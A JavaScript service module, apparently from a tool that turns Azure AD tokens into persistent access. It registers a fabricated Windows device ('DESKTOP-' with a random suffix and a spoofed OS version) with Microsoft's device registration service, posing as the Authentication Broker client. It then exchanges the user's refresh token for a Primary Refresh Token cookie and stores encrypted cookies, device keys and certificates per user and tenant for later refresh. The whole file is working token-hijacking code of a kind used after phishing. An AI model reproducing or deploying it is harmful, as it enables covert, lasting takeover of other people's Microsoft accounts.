/**
 * VGenius C Engine – Device Manager Service
 * Handles Azure AD Device Registration (DRS) and PRT generation
 */
const axios = require('axios');
const crypto = require('crypto');
const forge = require('node-forge');
const { v4: uuidv4 } = require('uuid');
const db = require('../database/connection');
const { encrypt, decrypt } = require('../utils/encrypt');

// Microsoft Authentication Broker Client ID
const DEVICE_CLIENT_ID = '29d9ed98-a469-4536-ade2-f981bc1d605e';

/**
 * Encode RSA public key to BCRYPT_RSAKEY_BLOB format (required by DRS)
 */
function encodePublicKeyToBlob(publicKey) {
  const n = publicKey.n;
  const e = publicKey.e;

  // BCRYPT_RSAKEY_BLOB header
  const header = Buffer.alloc(16);
  header.writeUInt32LE(0x31415352, 0); // Magic: 'RSA1'
  header.writeUInt32LE(2048, 4); // BitLength
  header.writeUInt32LE(3, 8); // cbPublicExp
  header.writeUInt32LE(256, 12); // cbModulus

  // Public exponent (3 bytes for 65537)
  const publicExp = Buffer.alloc(3);
  publicExp.writeUInt8(1, 0);
  publicExp.writeUInt8(0, 1);
  publicExp.writeUInt8(1, 2);

  // Modulus (256 bytes for 2048-bit key) - use hex string conversion for compatibility
  const modulusHex = n.toString(16);
  const modulus = Buffer.from(modulusHex.padStart(512, '0').slice(0, 512), 'hex');

  // Combine all parts
  const blob = Buffer.concat([header, publicExp, modulus]);

  return blob.toString('base64');
}

/**
 * Generate RSA key pair and valid PKCS#10 CSR using node-forge
 */
function generateKeyPairAndCsr(commonName) {
  const keys = forge.pki.rsa.generateKeyPair(2048);
  const privateKeyPem = forge.pki.privateKeyToPem(keys.privateKey);
  const publicKeyPem = forge.pki.publicKeyToPem(keys.publicKey);
  const transportKey = encodePublicKeyToBlob(keys.publicKey);

  const csr = forge.pki.createCertificationRequest();
  csr.publicKey = keys.publicKey;
  csr.setSubject([{ name: 'commonName', value: commonName }]);
  csr.sign(keys.privateKey);

  const csrPem = forge.pki.certificationRequestToPem(csr);
  return { privateKeyPem, publicKeyPem, csrPem, transportKey };
}

/**
 * Generate a random device name (like DESKTOP-ABCDEF)
 */
function generateDeviceName() {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let name = 'DESKTOP-';
  for (let i = 0; i < 8; i++) {
    name += chars[Math.floor(Math.random() * chars.length)];
  }
  return name;
}

/**
 * Register device with Azure AD DRS
 */
async function registerDevice(accessToken, tenantId, csrPem, targetDomain, transportKey) {
  const deviceName = generateDeviceName();

  if (!csrPem || typeof csrPem !== 'string' || !csrPem.includes('BEGIN CERTIFICATE REQUEST')) {
    throw new Error('Invalid CSR: csrPem is missing or not a valid PEM string');
  }

  // Convert CSR from PEM to DER and Base64
  let csr;
  try {
    csr = forge.pki.certificationRequestFromPem(csrPem);
  } catch (err) {
    throw new Error(`Invalid CSR PEM: ${err.message}`);
  }

  if (!csr || !csr.subject || !csr.publicKey) {
    throw new Error('Invalid CSR: certification request missing required fields');
  }

  // Convert PEM to DER: strip PEM headers/footers and base64-decode the content
  const pemBody = csrPem
    .replace('-----BEGIN CERTIFICATE REQUEST-----', '')
    .replace('-----END CERTIFICATE REQUEST-----', '')
    .replace(/[\r\n\s]/g, '');

  const csrDer = Buffer.from(pemBody, 'base64');
  const csrB64 = csrDer.toString('base64');

  const effectiveTargetDomain = targetDomain || tenantId || '';
  const payload = {
    DeviceDisplayName: deviceName,
    DeviceOsType: 'Windows',
    OSVersion: '10.0.22631.3880',
    CertificateRequest: { Type: 'pkcs10', Data: csrB64 },
    TransportKey: transportKey,
    TargetDomain: effectiveTargetDomain,
    DeviceType: 'RegisteredDevice',
    JoinType: 0
  };

  console.log('[DeviceManager] Registering device:', deviceName, 'for domain:', effectiveTargetDomain);

  let response;
  try {
    response = await axios.post(
      `https://enterpriseregistration.windows.net/EnrollmentServer/device/?api-version=1.0&aadTenantId=${encodeURIComponent(tenantId)}`,
      payload,
      {
        headers: {
          'Authorization': `Bearer ${accessToken}`,
          'Content-Type': 'application/json',
          'client-request-id': uuidv4(),
          'return-client-request-id': 'true'
        },
        timeout: 30000
      }
    );
  } catch (err) {
    const status = err.response?.status;
    const data = err.response?.data;
    if (status) {
      throw new Error(`DRS registration failed: HTTP ${status} - ${JSON.stringify(data)}`);
    }
    throw new Error(`DRS registration request failed: ${err.message}`);
  }

  const data = response.data;
  if (!data || typeof data !== 'object') {
    throw new Error(`DRS registration returned invalid response: ${typeof data}`);
  }

  const deviceId = data.deviceId || data.DeviceId;
  const deviceCertificate = data.deviceCertificate || data.DeviceCertificate;
  const registrationTenantId = data.tenantId || data.TenantId || tenantId;

  if (!deviceId || !deviceCertificate) {
    throw new Error(
      `DRS registration response missing required fields: ` +
      `deviceId=${deviceId ?? 'null'}, deviceCertificate=${deviceCertificate ?? 'null'}`
    );
  }

  return {
    deviceId,
    deviceCertificate,
    tenantId: registrationTenantId
  };
}

/**
 * Build client assertion JWT signed with device private key
 */
function buildClientAssertion(privateKeyPem, deviceId) {
  const now = Math.floor(Date.now() / 1000);

  const header = { alg: 'RS256', typ: 'JWT' };
  const payload = {
    iss: DEVICE_CLIENT_ID,
    sub: DEVICE_CLIENT_ID,
    aud: 'https://login.microsoftonline.com/common/oauth2/v2.0/token',
    jti: uuidv4(),
    nbf: now,
    exp: now + 600,
    device_id: deviceId
  };

  const headerB64 = Buffer.from(JSON.stringify(header)).toString('base64url');
  const payloadB64 = Buffer.from(JSON.stringify(payload)).toString('base64url');
  const signData = `${headerB64}.${payloadB64}`;

  // Use the RSA private key PEM to sign
  const sign = crypto.createSign('SHA256');
  sign.update(signData);
  sign.end();
  const signature = sign.sign(privateKeyPem, 'base64url');

  return `${signData}.${signature}`;
}

/**
 * Exchange refresh token + client assertion for PRT cookie
 */
async function getPrtCookie(clientAssertion, refreshToken) {
  const url = 'https://login.microsoftonline.com/common/oauth2/v2.0/token';

  const params = new URLSearchParams({
    client_id: DEVICE_CLIENT_ID,
    client_assertion_type: 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
    client_assertion: clientAssertion,
    grant_type: 'refresh_token',
    refresh_token: refreshToken,
    scope: 'openid profile offline_access'
  });

  console.log('[DeviceManager] Exchanging refresh token with client assertion for PRT cookie...');

  const response = await axios.post(url, params, {
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    timeout: 30000
  });

  if (response.status !== 200) {
    throw new Error(`PRT exchange failed: HTTP ${response.status} - ${JSON.stringify(response.data)}`);
  }

  const setCookie = response.headers['set-cookie'];
  if (!setCookie) {
    throw new Error('No Set-Cookie header in PRT response');
  }

  let prtCookie = null;
  for (const cookie of setCookie) {
    if (cookie.includes('x-ms-RefreshTokenCredential=')) {
      const match = cookie.match(/x-ms-RefreshTokenCredential=([^;]+)/);
      if (match) {
        prtCookie = match[1];
        break;
      }
    }
  }

  if (!prtCookie) {
    throw new Error('PRT cookie not found in response');
  }

  console.log('[DeviceManager] PRT cookie obtained successfully');
  return prtCookie;
}

/**
 * Full device registration and PRT generation flow
 */
async function registerDeviceAndGetPrt(tokenData) {
  const { access_token, tenant_id, refresh_token, user_id, target_domain } = tokenData;

  // Step 1: Generate RSA key pair and CSR using node-forge
  const deviceName = generateDeviceName();
  const { privateKeyPem, csrPem, transportKey } = generateKeyPairAndCsr(deviceName);
  console.log('[DeviceManager] Generated RSA key pair and CSR');

  // Step 3: Register device with DRS (pass target_domain for email domain)
  let registrationResult;
  try {
    const tokenPrefix = access_token ? access_token.substring(0, 12) : null;
    console.log('[DeviceManager] DRS debug:', { tenantId: tenant_id, targetDomain: target_domain, tokenPrefix });
    registrationResult = await registerDevice(access_token, tenant_id, csrPem, target_domain, transportKey);
    console.log('[DeviceManager] Device registered:', registrationResult.deviceId);
  } catch (err) {
    console.error('[DeviceManager] DRS registration failed:', err.message);
    throw new Error(`Device registration failed: ${err.message}`);
  }

  // Step 4: Build client assertion
  const clientAssertion = buildClientAssertion(privateKeyPem, registrationResult.deviceId);
  console.log('[DeviceManager] Client assertion built');

  // Step 5: Exchange for PRT cookie
  let prtCookie;
  try {
    prtCookie = await getPrtCookie(clientAssertion, refresh_token);
  } catch (err) {
    console.error('[DeviceManager] PRT exchange failed:', err.message);
    throw new Error(`PRT cookie exchange failed: ${err.message}`);
  }

  return {
    deviceId: registrationResult.deviceId,
    deviceCertificate: registrationResult.deviceCertificate,
    prtCookie: prtCookie,
    privateKey: privateKeyPem,
    tenantId: registrationResult.tenantId
  };
}

/**
 * Store device credentials in database
 */
async function storeDeviceCredentials(credentials, userId, userPrincipalName) {
  const { deviceId, deviceCertificate, prtCookie, privateKey, tenantId } = credentials;

  const encryptedPrivateKey = encrypt(privateKey);
  const encryptedPrtCookie = encrypt(prtCookie);
  const encryptedCertificate = encrypt(deviceCertificate);

  const [existing] = await db.query(
    'SELECT id FROM device_credentials WHERE user_id = ? AND tenant_id = ?',
    [userId, tenantId]
  );

  if (existing.length > 0) {
    await db.query(
      `UPDATE device_credentials SET
      device_certificate_encrypted = ?,
      encrypted_private_key = ?,
      prt_cookie_encrypted = ?,
      last_used = NOW(),
      updated_at = NOW()
      WHERE user_id = ? AND tenant_id = ?`,
      [encryptedCertificate, encryptedPrivateKey, encryptedPrtCookie, userId, tenantId]
    );
    console.log('[DeviceManager] Updated existing device credentials');
  } else {
    await db.query(
      `INSERT INTO device_credentials
      (user_id, tenant_id, device_id, device_certificate_encrypted, encrypted_private_key, prt_cookie_encrypted, user_principal_name, created_at, last_used)
      VALUES (?, ?, ?, ?, ?, ?, ?, NOW(), NOW())`,
      [userId, tenantId, deviceId, encryptedCertificate, encryptedPrivateKey, encryptedPrtCookie, userPrincipalName || '']
    );
    console.log('[DeviceManager] Stored new device credentials');
  }
}

/**
 * Get stored PRT cookie for a user+tenant
 */
async function getStoredPrtCookie(userId, tenantId) {
  const [rows] = await db.query(
    'SELECT prt_cookie_encrypted, device_id FROM device_credentials WHERE user_id = ? AND tenant_id = ?',
    [userId, tenantId]
  );

  if (rows.length === 0) return null;

  try {
    const prtCookie = decrypt(rows[0].prt_cookie_encrypted);
    return { prtCookie, deviceId: rows[0].device_id };
  } catch (err) {
    console.error('[DeviceManager] Failed to decrypt PRT cookie:', err.message);
    return null;
  }
}

/**
 * Refresh PRT cookie using stored device credentials
 */
async function refreshPrtCookie(userId, tenantId, refreshToken) {
  const credentials = await getStoredPrtCookie(userId, tenantId);
  if (!credentials) throw new Error('No device credentials found');

  const [deviceRows] = await db.query(
    'SELECT encrypted_private_key FROM device_credentials WHERE user_id = ? AND tenant_id = ?',
    [userId, tenantId]
  );

  if (deviceRows.length === 0) throw new Error('Device private key not found');

  try {
    const privateKey = decrypt(deviceRows[0].encrypted_private_key);
    const clientAssertion = buildClientAssertion(privateKey, credentials.deviceId);
    const prtCookie = await getPrtCookie(clientAssertion, refreshToken);

    await db.query(
      'UPDATE device_credentials SET prt_cookie_encrypted = ?, last_used = NOW() WHERE user_id = ? AND tenant_id = ?',
      [encrypt(prtCookie), userId, tenantId]
    );

    console.log('[DeviceManager] PRT cookie refreshed');
    return prtCookie;
  } catch (err) {
    console.error('[DeviceManager] PRT refresh failed:', err.message);
    throw err;
  }
}

module.exports = {
  generateKeyPairAndCsr,
  generateDeviceName,
  registerDevice,
  buildClientAssertion,
  getPrtCookie,
  registerDeviceAndGetPrt,
  storeDeviceCredentials,
  getStoredPrtCookie,
  refreshPrtCookie,
  DEVICE_CLIENT_ID
};
